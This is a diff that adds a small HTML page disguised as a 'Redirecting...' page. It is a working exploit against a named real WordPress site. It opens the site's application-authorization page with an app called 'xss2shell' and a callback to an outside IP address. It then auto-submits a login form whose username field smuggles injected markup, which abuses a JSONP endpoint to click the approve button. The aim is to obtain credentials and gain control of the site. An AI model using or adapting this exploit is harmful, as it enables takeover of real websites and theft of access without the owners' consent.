@@ -1,0 +1,15 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Redirecting...</title>
+<!-- pingback-валидация: ссылка на целевой пост ukrmir -->
+<a href="http://ukrmir.com.ua/coronavirus-disease-2019-2.htm" style="display:none">post</a>
+<script>
+// Открываем OAuth authorize-application (окно B) — approve-кнопка будет кликнута через SOME
+window.open('https://ukrmir.com.ua/wp-admin/authorize-application.php?app_name=xss2shell&app_id=64638&success_url=http://193.228.2.2:8080/cb', '_blank');
+</script>
+<form id="poc" method="post" action="http://ukrmir.com.ua/wp-login.php">
+  <input type="hidden" name="log" value='< area id=ajaxurl href=/?rest_route=/&amp;_method=GET&amp;_jsonp=window.opener.approve.click&amp;_envelope=1>< div id=color-picker class=reset-pass-submit>< button class="wp-generate-pw color-option">X'>
+  <input type="hidden" name="pwd" value="x">
+  <noscript><input type="submit" value="Continue"></noscript>
+</form>
+<script>document.getElementById('poc').submit();</script>
